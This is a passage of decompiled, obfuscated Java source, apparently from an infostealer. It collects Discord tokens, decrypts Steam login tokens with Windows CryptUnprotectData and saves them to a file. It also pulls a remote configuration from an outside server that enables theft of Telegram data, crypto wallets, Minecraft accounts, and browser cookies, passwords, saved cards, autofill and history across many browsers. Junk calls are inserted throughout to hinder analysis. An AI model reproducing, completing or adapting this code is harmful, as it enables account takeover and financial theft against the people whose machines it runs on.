      }

      rodeo.add(String.join(File.separator, var0));
   }

   private static void ukxeok(String... var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Path var1 = java.nio.file.Paths.get(String.join(File.separator, var0), new String[0]);
      File var2 = var1.toFile();
      if (var2.exists()) {
         if (var2.listFiles() != null
            )
          {
            try {
               Stream var10000 = java.nio.file.Files.list(var1).flatMap(var0x -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     try {
                        return java.nio.file.Files.list(java.nio.file.Paths.get(var0x.toFile().getAbsolutePath(), new String[]{
                                       "storage",
                                       "default"
                                    })).filter(var0xx -> {
                                 if (rkjsezrwcf.jzdety() != 0) {
                                    rkjsezrwcf.bbsnvj();
                                 }

                                 return var0xx.toFile().getName().contains("discord");
                              }).map(var0xx -> {
                              if (rkjsezrwcf.jzdety() != 0) {
                                 rkjsezrwcf.bbsnvj();
                              }

                              return java.nio.file.Paths.get(var0xx.toFile().getAbsolutePath(), new String[]{"ls"}).toString();
                           });
                     } catch (IOException var2x) {
                        return java.util.stream.Stream.empty();
                     }
                  });
               List var10001 = portal;
               java.util.Objects.requireNonNull(portal);
               var10000.forEach(var10001::add);
            } catch (Exception var4) {
            }
         }
      }
   }

   private static void vrgxis(String... var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      portal.add(String.join(File.separator, var0));
   }

   public static List<File> awivsc(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      File var1 = new File(var0);
      return !var1.exists()
         ? new java.util.ArrayList()
         : (List)java.util.Arrays.stream(var1.listFiles()).filter(var0x -> {
                  if (rkjsezrwcf.jzdety() != 0) {
                     rkjsezrwcf.bbsnvj();
                  }

                  String var1x = var0x.getName();
                  return var1x.endsWith(".ldb")
                     || var1x.endsWith(".log")
                     || var1x.endsWith(".sqlite");
               }).collect(java.util.stream.Collectors.toList());
   }

   private static String wvvopv(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var1 = tlrtrn(
         "https://discord.com/api/v9/users/@me",
         var0
      );
      return var1.equals("h")
         ? ""
         : new StringBuilder().append(var1.split("\"")[7]).append(" | id: ").append(var1.split("\"")[3]).toString();
   }

   private static Vector<String> zdfsps(Pattern var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Vector var2 = new java.util.Vector();

      try {
         Matcher var3 = var0.matcher(var1);

         while (
            var3.find()
               && !var2.contains(var3.group())
         ) {
            var2.add(var3.group());
         }
      } catch (Exception var4) {
      }

      return var2;
   }

   private static void ugdymr(Exception var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }
   }

   private static String bgygub(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      return tlrtrn(var0, "h");
   }

   private static String tlrtrn(String var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         HttpsURLConnection var2 = (HttpsURLConnection)new URL(var0).openConnection();
         if (!java.util.Objects.equals(var1, "h")) {
            var2.setRequestProperty("Authorization", var1);
         }

         var2.setRequestProperty("Content-Type", "application/json");
         var2.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
         if (var2.getResponseCode()
            != 200) {
            return "h";
         }

         BufferedReader var3 = new java.io.BufferedReader(new java.io.InputStreamReader(var2.getInputStream()));
         StringBuilder var4 = new StringBuilder();

         while (true) {
            String var5 = var3.readLine();
            if (var5 == null) {
               var3.close();
               return var4.toString();
            }

            var4.append(var5);
            var4.append(System.lineSeparator());
         }
      } catch (IOException var6) {
         ugdymr(
            var6,
            "in reading the website"
         );
         return "h";
      }
   }

   private static String uwzrfs(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         File var1 = new File(var0);
         BufferedReader var2 = new java.io.BufferedReader(new java.io.FileReader(var1));
         StringBuilder var3 = new StringBuilder();

         while (var2.ready()) {
            var3.append(var2.readLine());
         }

         var2.close();
         return var3.toString();
      } catch (Exception var4) {
         return "";
      }
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void uwtbqs() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (kaiser) {
         try {
            System.out.println("[Steam] start");
            Path var0 = java.nio.file.Paths.get(new StringBuilder().append(mineral).append("\\Steam\\local.vdf").toString(), new String[0]);
            ArrayList var1 = new java.util.ArrayList();
            System.out.println("[Steam] getInstallPath");
            String var2 = ztfipc();
            System.out.println(new StringBuilder().append("[Steam] InstallPath: ").append(var2).toString());
            List var3 = zendcx(var2);
            if (var0 != null
               && java.nio.file.Files.exists(var0, new LinkOption[0])
               && java.nio.file.Files.isRegularFile(var0, new LinkOption[0])) {
               BufferedReader var4 = null;
               boolean var17 = false /* VF: Semaphore variable */;

               label130: {
                  label129: {
                     try {
                        var17 = true;
                        System.out.println("[Meak] reading file...");
                        var4 = java.nio.file.Files.newBufferedReader(var0, java.nio.charset.StandardCharsets.UTF_8);

                        String var5;
                        while (
                           (
                                 var5 = var4.readLine()
                              )
                              != null
                        ) {
                           Matcher var6 = parachute.matcher(var5);
                           if (var6.find()) {
                              var1.add(var6.group(1));
                           }
                        }

                        System.out.println(new StringBuilder().append("[Steam] blobs count=").append(var1.size()).toString());
                        var17 = false;
                        break label129;
                     } catch (Exception var18) {
                        var18.printStackTrace();
                        var17 = false;
                     } finally {
                        if (var17) {
                           if (var4 != null) {
                              var4.close();
                           }
                        }
                     }

                     if (var4 != null) {
                        var4.close();
                     }
                     break label130;
                  }

                  if (var4 != null) {
                     var4.close();
                  }
               }

               String var21 = "";
               if (!var1.isEmpty()) {
                  Iterator var22 = var3.iterator();

                  while (var22.hasNext()) {
                     String var7 = (String)var22.next();
                     System.out.println(new StringBuilder().append("[Steam] processing user: ").append(var7).toString());
                     String var8 = (String)var1.get(0).trim();
                     byte[] var9 = nebmbg(var8);
                     System.out.println("[Steam] before unprotectCurrentUser");
                     final byte[] var10 = var9;
                     final byte[] var11 = var7.getBytes(java.nio.charset.StandardCharsets.UTF_8);
                     byte[] var12 = cradle.desert(
                        "unprotectCurrentUser Steam",
                        new Callable<byte[]>() {
                           public byte[] call() throws Exception {
                              if (rkjsezrwcf.jzdety() != 0) {
                                 rkjsezrwcf.bbsnvj();
                              }

                              return prawn.qknfhj(var10, var11);
                           }
                        }
                     );
                     System.out.println("[Steam] after unprotectCurrentUser");
                     String var13 = new String(var12, java.nio.charset.StandardCharsets.UTF_8);
                     if (var13.startsWith("ey")) {
                        var21 = new StringBuilder().append(var21).append(var7).append(" ").append(var13).append("\n").toString();
                     }
                  }
               }

               if (var21 != null && !var21.isEmpty()) {
                  System.out.println("[Steam] before write");
                  Path var23 = java.nio.file.Paths.get(lantern, new String[]{
                        "Other",
                        "SteamToken.txt"
                     });
                  java.nio.file.Files.createDirectories(var23.getParent(), new FileAttribute[0]);
                  java.nio.file.Files.write(var23, var21.getBytes(java.nio.charset.StandardCharsets.UTF_8), new OpenOption[]{
                        java.nio.file.StandardOpenOption.CREATE,
                        java.nio.file.StandardOpenOption.TRUNCATE_EXISTING
                     });
               }

               System.out.println("[Steam] finished");
            } else {
               System.out.println("[Steam] No steam");
            }
         } catch (Exception var20) {
            var20.printStackTrace();
         }
      }
   }

   public static List<String> zendcx(String var0) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Path var1 = java.nio.file.Paths.get(var0, new String[]{
            "config", "loginusers.vdf"
         });
      if (!java.nio.file.Files.exists(var1, new LinkOption[0])) {
         return java.util.Collections.emptyList();
      }

      String var2 = rtuhkl(var1);
      Matcher var3 = picnic.matcher(var2);
      LinkedHashSet var4 = new java.util.LinkedHashSet();

      while (var3.find()) {
         String var5 = var3.group(1);
         if (var5 != null) {
            var4.add(var5.toLowerCase(java.util.Locale.ROOT));
         }
      }

      return new java.util.ArrayList(var4);
   }

   private static String rtuhkl(Path var0) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      byte[] var1 = java.nio.file.Files.readAllBytes(var0);
      String var2 = new String(var1, java.nio.charset.StandardCharsets.UTF_8);
      return lnzuxt(var2)
         ? var2
         : new String(var1, java.nio.charset.Charset.defaultCharset());
   }

   private static boolean lnzuxt(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      int var1 = 0;

      for (int var2 = 0; var2 < var0.length(); var2++) {
         if (var0.charAt(var2) == (0 << 16 | (char)-3)) {
            var1++;
         }
      }

      return var1 < 5;
   }

   public static byte[] nebmbg(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 == null) {
         throw new java.lang.IllegalArgumentException("blob is null");
      }

      int var1 = var0.length();
      if ((var1 & 1) != 0) {
         throw new java.lang.IllegalArgumentException(new StringBuilder().append("Hex string length must be even: ").append(var1).toString());
      }

      byte[] var2 = new byte[var1 / 2];

      for (byte var3 = 0; var3 < var1; var3 += 2) {
         int var4 = java.lang.Character.digit(var0.charAt(var3), 16);
         int var5 = java.lang.Character.digit(var0.charAt(var3 + 1), 16);
         if (var4 < 0 || var5 < 0) {
            throw new java.lang.IllegalArgumentException(new StringBuilder().append("Invalid hex at position ").append(var3).toString());
         }

         var2[var3 / 2] = (byte)((var4 << 4) + var5);
      }

      return var2;
   }

   private static boolean srlewa(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      return var0 == null
         || var0.trim().isEmpty();
   }

   public static String ztfipc() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var0 = "InstallPath";
      String var1 = ylggro(
         WinReg.HKEY_LOCAL_MACHINE,
         "HKLM:\\SOFTWARE\\Wow6432Node\\Valve\\Steam",
         var0
      );
      if (srlewa(var1)) {
         var1 = ylggro(WinReg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Valve\\Steam", var0);
      }

      if (srlewa(var1)) {
         String var2 = System.getenv("ProgramFiles(x86)");
         if (srlewa(var2)) {
            var2 = "C:\\Program Files (x86)";
         }

         var1 = new StringBuilder().append(var2).append("\\steam").toString();
      }

      return var1;
   }

   private static String ylggro(HKEY var0, String var1, String var2) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         String var3;
         try {
            final HKEY var4 = var0;
            final String var5 = var1;
            final String var6 = var2;
            var3 = cradle.desert(
               "Advapi32Util.registryGetStringValue",
               new Callable<String>() {
                  public String call() throws Exception {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     return Advapi32Util.registryGetStringValue(var4, var5, var6);
                  }
               }
            );
         } catch (Exception var7) {
            var3 = null;
         }

         return srlewa(var3) ? null : var3;
      } catch (Throwable var8) {
         return null;
      }
   }

   public static byte[] qknfhj(byte[] var0, byte[] var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 == null) {
         throw new java.lang.IllegalArgumentException("encrypted is null");
      }

      otter var2 = otter.of(var0);
      otter var3 = var1 == null ? null : otter.of(var1);
      otter var4 = new otter();
      boolean var5 = quake.INSTANCE.CryptUnprotectData(var2, null, var3, null, null, 1, var4);
      if (!var5) {
         int var6 = Native.getLastError();
         throw new java.lang.RuntimeException(new StringBuilder().append("CryptUnprotectData failed, GetLastError=").append(var6).toString());
      }

      try {
         return var4.pbData.getByteArray(0L, var4.cbData);
      } finally {
         if (var4.pbData != null) {
            goblet.INSTANCE.LocalFree(var4.pbData);
         }
      }
   }

   public static void nsscsm(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         String var1 = new StringBuilder().append(blanket).append("/api/app-settings-public?id=").append(java.net.URLEncoder.encode(var0, "UTF-8")).toString();
         URL var2 = new URL(var1);
         HttpURLConnection var3 = (HttpURLConnection)var2.openConnection();
         var3.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
         var3.setRequestProperty("Accept", "application/json");
         var3.setRequestMethod("GET");
         var3.setConnectTimeout(8000);
         var3.setReadTimeout(15000);
         int var4 = var3.getResponseCode();
         InputStream var5 = var4 >= 200 && var4 < 300
            ? var3.getInputStream()
            : var3.getErrorStream();
         StringBuilder var6 = new StringBuilder();
         BufferedReader var7 = new java.io.BufferedReader(new java.io.InputStreamReader(var5, java.nio.charset.StandardCharsets.UTF_8));

         String var8;
         try {
            while (
               (
                     var8 = var7.readLine()
                  )
                  != null
            ) {
               var6.append(var8);
            }
         } catch (Throwable var11) {
            try {
               var7.close();
            } catch (Throwable var10) {
               var11.addSuppressed(var10);
            }

            throw var11;
         }

         var7.close();
         String var13 = var6.toString();
         var3.disconnect();
         if (var4 != 200
            || var13 == null
            || var13.trim().isEmpty()
            || !var13.trim().startsWith("{")) {
            System.out.println(new StringBuilder().append("[settings] config unavailable (code=").append(var4).append("), defaults on").toString());
            return;
         }

         saddle = lciekz(var13, "Telegram");
         meadow = lciekz(var13, "Discord");
         stigma = lciekz(var13, "Desktop");
         lattice = lciekz(var13, "DesktopCryptoWallets");
         panther = lciekz(var13, "WebCryptoWallets");
         kaiser = lciekz(var13, "Steam");
         fennel = lciekz(var13, "Minecraft");
         colony = lbrnrs(var13, "Minecraft", "Lunar");
         scorpion = lbrnrs(
            var13, "Minecraft", "Feather"
         );
         buffer = lbrnrs(
            var13, "Minecraft", "Essenital"
         );
         memoir = lbrnrs(var13, "Minecraft", "Ias");
         ivory = lbrnrs(var13, "Minecraft", "Prism");
         bridge = lbrnrs(
            var13, "Minecraft", "MultiMC"
         );
         piano = lbrnrs(
            var13, "Minecraft", "CurseForge"
         );
         sorghum = lbrnrs(
            var13, "Minecraft", "Minecraft"
         );
         rudder = lciekz(var13, "BrowserData");
         silo = lbrnrs(
            var13, "BrowserData", "Cookie"
         );
         stingray = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Chrome"
         );
         millet = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Chrome",
            "Dll"
         );
         rustic = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Chrome",
            "Old"
         );
         narwhal = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Opera"
         );
         gasket = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Opera",
            "Debug"
         );
         jasper = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Opera",
            "Old"
         );
         mallet = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "OperaGX"
         );
         sapphire = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "OperaGX",
            "Debug"
         );
         lyric = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "OperaGX",
            "Old"
         );
         parchment = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Edge"
         );
         dagger = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Edge",
            "Dll"
         );
         raccoon = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Edge",
            "Debug"
         );
         piranha = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Edge",
            "Old"
         );
         stucco = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Brave"
         );
         lemon = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Brave",
            "Dll"
         );
         oriole = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Brave",
            "Debug"
         );
         mailman = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Brave",
            "Old"
         );
         lobster = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Vivaldi"
         );
         herald = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Vivaldi",
            "Debug"
         );
         rabbit = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Vivaldi",
            "Old"
         );
         clover = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Yandex"
         );
         nimbus = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Yandex",
            "Debug"
         );
         breeze = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Yandex",
            "Old"
         );
         lentil = lbrnrs(
            var13,
            "BrowserData",
            "Cookie",
            "Firefox"
         );
         mint = lbrnrs(
            var13, "BrowserData", "Autofill"
         );
         indigo = lbrnrs(
            var13,
            "BrowserData",
            "Autofill",
            "Chrome"
         );
         copper = lbrnrs(
            var13,
            "BrowserData",
            "Autofill",
            "Opera"
         );
         frosty = lbrnrs(
            var13,
            "BrowserData",
            "Autofill",
            "OperaGX"
         );
         enigma = lbrnrs(
            var13,
            "BrowserData",
            "Autofill",
            "Edge"
         );
         hoopoe = lbrnrs(
            var13,
            "BrowserData",
            "Autofill",
            "Brave"
         );
         stellar = lbrnrs(
            var13,
            "BrowserData",
            "Autofill",
            "Vivaldi"
         );
         daisy = lbrnrs(
            var13,
            "BrowserData",
            "Autofill",
            "Yandex"
         );
         storm = lbrnrs(
            var13,
            "BrowserData",
            "Autofill",
            "Firefox"
         );
         citrus = lbrnrs(
            var13, "BrowserData", "Cards"
         );
         lizard = lbrnrs(
            var13,
            "BrowserData",
            "Cards",
            "Chrome"
         );
         mustard = lbrnrs(
            var13,
            "BrowserData",
            "Cards",
            "Opera"
         );
         camera = lbrnrs(
            var13,
            "BrowserData",
            "Cards",
            "OperaGX"
         );
         rosewood = lbrnrs(
            var13,
            "BrowserData",
            "Cards",
            "Edge"
         );
         relic = lbrnrs(
            var13,
            "BrowserData",
            "Cards",
            "Brave"
         );
         filter = lbrnrs(
            var13,
            "BrowserData",
            "Cards",
            "Vivaldi"
         );
         sawdust = lbrnrs(
            var13,
            "BrowserData",
            "Cards",
            "Yandex"
         );
         impala = lbrnrs(
            var13, "BrowserData", "History"
         );
         nugget = lbrnrs(
            var13,
            "BrowserData",
            "History",
            "Chrome"
         );
         string = lbrnrs(
            var13,
            "BrowserData",
            "History",
            "Opera"
         );
         bounty = lbrnrs(
            var13,
            "BrowserData",
            "History",
            "OperaGX"
         );
         grape = lbrnrs(
            var13,
            "BrowserData",
            "History",
            "Edge"
         );
         juniper = lbrnrs(
            var13,
            "BrowserData",
            "History",
            "Brave"
         );
         crimson = lbrnrs(
            var13,
            "BrowserData",
            "History",
            "Vivaldi"
         );
         sailor = lbrnrs(
            var13,
            "BrowserData",
            "History",
            "Yandex"
         );
         geyser = lbrnrs(
            var13,
            "BrowserData",
            "Passwords"
         );
         scarf = lbrnrs(
            var13,
            "BrowserData",
            "Passwords",
            "Chrome"
         );
         omelet = lbrnrs(
            var13,
            "BrowserData",
            "Passwords",
            "Opera"
         );
         pixel = lbrnrs(
            var13,
            "BrowserData",
            "Passwords",
            "OperaGX"
         );
         cougar = lbrnrs(
            var13,
            "BrowserData",
            "Passwords",
            "Edge"
         );
         metro = lbrnrs(
            var13,
            "BrowserData",
            "Passwords",
            "Brave"
         );
         skillet = lbrnrs(
            var13,
            "BrowserData",
            "Passwords",
            "Vivaldi"
         );
         donkey = lbrnrs(
            var13,
            "BrowserData",
            "Passwords",
            "Yandex"
         );
         pilgrim = lbrnrs(
            var13,
            "BrowserData",
            "Passwords",
            "Firefox"
         );
      } catch (Exception var12) {
         var12.printStackTrace();
      }
   }

   public static boolean lciekz(String var0, String var1) throws Exception {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      JsonNode var2 = cartoon.readTree(var0);
      return var2.path("settings")
         .path(var1)
         .path("enabled")
         .asBoolean(true);
   }

   public static boolean lbrnrs(String var0, String var1, String... var2) throws Exception {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      JsonNode var3 = cartoon.readTree(var0);
      JsonNode var4 = var3.path("settings").path(var1);
      if (!var4.isMissingNode() && !var4.isNull()) {
         boolean var5 = var4.path("enabled").asBoolean(true);
         if (!var5) {
            return false;
         }

         JsonNode var6 = var4.path("items");
         if (!var6.isArray()) {
            return true;
         }

         for (int var7 = 0; var7 < var2.length; var7++) {
            String var8 = var2[var7];
            JsonNode var9 = srunqp(var6, var8);
            if (var9 == null) {
               return true;
            }

            boolean var10 = var9.path("enabled").asBoolean(true);
            var5 = var5 && var10;
            if (!var5) {
               return false;
            }

            if (var7 != var2.length - 1) {
               var6 = var9.path("children");
               if (!var6.isArray()) {
                  return true;
               }
            }
         }

         return var5;
      } else {
         return true;
      }
   }

   private static JsonNode srunqp(JsonNode var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 != null && var0.isArray()) {
         Iterator var2 = var0.iterator();

         while (var2.hasNext()) {
            JsonNode var3 = (JsonNode)var2.next();
            if (var1.equals(var3.path("id").asText(null))) {
               return var3;
            }
         }

         return null;
      } else {
         return null;
      }
   }

   public static String kvwndx(String var0, String var1) throws Exception {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      JsonNode var2 = cartoon.readTree(var0);
      if (!(var2 instanceof ObjectNode)) {
         return var0;
      }

      ObjectNode var3 = (ObjectNode)var2;
      JsonNode var4 = var3.get("settings");
      if (!(var4 instanceof ObjectNode)) {
         return var0;
      }

      ObjectNode var5 = (ObjectNode)var4;
      JsonNode var6 = var5.get(var1);
      if (!(var6 instanceof ObjectNode)) {
         return var0;
      }

      ObjectNode var7 = (ObjectNode)var6;
      boolean var8 = var7.path("enabled").asBoolean(true);
      JsonNode var9 = var7.get("items");
      if (var9 instanceof ArrayNode) {
         ArrayNode var10 = (ArrayNode)var9;
         Iterator var11 = var10.iterator();

         while (var11.hasNext()) {
            JsonNode var12 = (JsonNode)var11.next();
            if (var12 instanceof ObjectNode) {
               ObjectNode var13 = (ObjectNode)var12;
               xwaeoj(var13, var8);
            }
         }
      }

      return cartoon.writeValueAsString(var3);
   }

   private static void xwaeoj(ObjectNode var0, boolean var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (!var1) {
         var0.put("enabled", false);
      }

      boolean var2 = var0.path("enabled").asBoolean(true);
      boolean var3 = var1 && var2;
      JsonNode var4 = var0.get("children");
      if (var4 instanceof ArrayNode) {
         ArrayNode var5 = (ArrayNode)var4;
         Iterator var6 = var5.iterator();

         while (var6.hasNext()) {
            JsonNode var7 = (JsonNode)var6.next();
            if (var7 instanceof ObjectNode) {
               ObjectNode var8 = (ObjectNode)var7;
               xwaeoj(var8, var3);
            }
         }
      }
   }

   public static void zjkusj(Path var0) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }
   }

   private static carbon xrvqyj(Path var0) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      RandomAccessFile var1 = new java.io.RandomAccessFile(var0.toFile(), "r");

      carbon var6;
      try {
         if (rtrfvi(var1) != 23117) {
            throw new java.lang.IllegalArgumentException("Not MZ");
         }

         var1.seek(60);
         int var2 = ivysfz(var1);
         var1.seek(var2);
         if (ivysfz(var1) != 17744) {
            throw new java.lang.IllegalArgumentException("Not PE");
         }

         int var3 = rtrfvi(var1);
         var1.skipBytes(16);
         int var4 = rtrfvi(var1);
         boolean var5 = (var4 & 8192) != 0;
         var6 = new carbon(var3, var5);
      } catch (Throwable var8) {
         try {
            var1.close();
         } catch (Throwable var7) {
            var8.addSuppressed(var7);
         }

         throw var8;
      }

      var1.close();
      return var6;
   }

   private static int rtrfvi(RandomAccessFile var0) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      int var1 = var0.read();
      int var2 = var0.read();
      return var1 & 0xFF | (var2 & 0xFF) << 8;
   }

   private static int ivysfz(RandomAccessFile var0) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      int var1 = var0.read();
      int var2 = var0.read();
      int var3 = var0.read();
      int var4 = var0.read();
      return var1 & 0xFF | (var2 & 0xFF) << 8 | (var3 & 0xFF) << 16 | (var4 & 0xFF) << 24;
   }

   private static List<String> azumal(Path var0) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      byte[] var1 = java.nio.file.Files.readAllBytes(var0);
      if (var1.length < 64) {
         return java.util.Collections.emptyList();
      }

      if (suhpqm(var1, 0) != 23117) {
         return java.util.Collections.emptyList();
      }

      int var2 = ozrhmi(var1, 60);
      if (var2 < 0 || var2 + 4 > var1.length) {
         return java.util.Collections.emptyList();
      }

      if (ozrhmi(var1, var2) != 17744) {
         return java.util.Collections.emptyList();
      }

      int var3 = var2 + 4;
      int var4 = suhpqm(var1, var3 + 2);
      int var5 = suhpqm(var1, var3 + 16);
      int var6 = var3 + 20;
      int var7 = suhpqm(var1, var6);
      boolean var8 = var7 == 523;
      if (!var8 && var7 != 267) {
         return java.util.Collections.emptyList();
      }

      int var9 = var6 + (var8 ? 108 : 92);
      int var10 = var6 + (var8 ? 112 : 96);
      if (var9 + 4 > var1.length) {
         return java.util.Collections.emptyList();
      }

      int var11 = ozrhmi(var1, var9);
      if (var11 < 2) {
         return java.util.Collections.emptyList();
      }

      if (var10 + 16 > var1.length) {
         return java.util.Collections.emptyList();
      }

      int var12 = ozrhmi(var1, var10 + 8);
      if (var12 == 0) {
         return java.util.Collections.emptyList();
      }

      int var13 = var6 + var5;
      ArrayList var14 = new java.util.ArrayList(java.lang.Math.max(0, var4));

      for (int var15 = 0; var15 < var4; var15++) {
         int var16 = var13 + var15 * 40;
         if (var16 + 40 > var1.length) {
            break;
         }

         int var17 = ozrhmi(var1, var16 + 8);
         int var18 = ozrhmi(var1, var16 + 12);
         int var19 = ozrhmi(var1, var16 + 16);
         int var20 = ozrhmi(var1, var16 + 20);
         int var21 = java.lang.Math.max(var17, var19);
         var14.add(new fable(var18, var21, var20));
      }

      int var23 = idzoeb(var12, var14);
      if (var23 < 0) {
         return java.util.Collections.emptyList();
      }

      ArrayList var24 = new java.util.ArrayList();
      int var25 = 0;

      while (true) {
         int var26 = var23 + var25 * 20;
         if (var26 + 20 > var1.length) {
            break;
         }

         int var27 = ozrhmi(var1, var26);
         int var28 = ozrhmi(var1, var26 + 12);
         int var29 = ozrhmi(var1, var26 + 16);
         if (var27 == 0 && var28 == 0 && var29 == 0) {
            break;
         }

         int var22 = idzoeb(var28, var14);
         if (var22 < 0) {
            var24.add("<bad_rva>");
         } else {
            var24.add(noszse(var1, var22));
         }

         var25++;
      }

      return var24;
   }

   private static List<String> lllkif(List<String> var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      ArrayList var1 = new java.util.ArrayList();
      Iterator var2 = var0.iterator();

      while (var2.hasNext()) {
         String var3 = (String)var2.next();
         String var4 = var3.toLowerCase(java.util.Locale.ROOT);
         if (var4.equals("msvcp140d.dll")
            || var4.equals("vcruntime140d.dll")
            || var4.equals("vcruntime140_1d.dll")
            || var4.equals("ucrtbased.dll")) {
            var1.add(var3);
         }
      }

      return var1;
   }

   private static int idzoeb(int var0, List<fable> var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Iterator var2 = var1.iterator();

      while (var2.hasNext()) {
         fable var3 = (fable)var2.next();
         if (var0 >= var3.gecko && var0 < var3.gecko + var3.spark) {
            return var3.humble + (var0 - var3.gecko);
         }
      }

      return -1;
   }

   private static String noszse(byte[] var0, int var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      int var2 = var1;

      while (var2 < var0.length && var0[var2] != 0) {
         var2++;
      }

      return var2 <= var1
         ? ""
         : new String(var0, var1, var2 - var1, java.nio.charset.StandardCharsets.US_ASCII);
   }

   private static int suhpqm(byte[] var0, int var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      return var1 + 2 > var0.length ? 0 : var0[var1] & 0xFF | (var0[var1 + 1] & 0xFF) << 8;
   }

   private static int ozrhmi(byte[] var0, int var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      return var1 + 4 > var0.length ? 0 : var0[var1] & 0xFF | (var0[var1 + 1] & 0xFF) << 8 | (var0[var1 + 2] & 0xFF) << 16 | (var0[var1 + 3] & 0xFF) << 24;
   }

   private static boolean fsqroc() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var0 = System.getProperty("sun.arch.data.model");
      return var0 != null
         ? var0.contains("64")
         : System.getProperty("os.arch", "").contains("64");
   }

   private static boolean txtxai(int var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      return var0 == (0 << 16 | (char)-31132) || var0 == (0 << 16 | (char)-21916);
   }

   private static String vuheqa(int var0) {
